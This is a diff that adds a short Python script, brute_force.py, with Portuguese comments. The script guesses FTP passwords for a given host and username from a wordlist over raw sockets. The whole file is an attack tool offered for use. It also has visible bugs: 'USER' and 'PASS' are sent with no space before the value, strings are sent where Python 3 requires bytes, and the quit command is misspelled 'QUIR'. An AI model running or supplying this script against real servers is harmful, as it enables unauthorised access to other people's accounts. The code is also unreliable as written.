@@ -1,0 +1,31 @@
+import socket
+import sys
+import re
+import time
+import os
+
+if len(sys.argv) < 3:
+    print("Use: python3 brute_force.py host username")
+
+server = sys.argv[1]
+user = sys.argv[2]
+
+file = open("password-wordlist.txt")
+for senha in file.readlines():
+    print(f"Testando User:",user,"Senha",senha)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, 21))
+    s.recv(1024)
+    s.send("USER"+user+"\r\n")
+    s.recv(1024)
+    s.send("PASS"+senha+"\r\n")
+    res = s.recv(1024)
+    s.send("QUIR\r\n")
+
+    if re.search("230", res):
+        print("Senha encontrada!\n>>",senha)
+        break
+    else:
+        print("Acesso negado!")
+        time.sleep(3)
+        os.system('clear')#Se for windows é cls
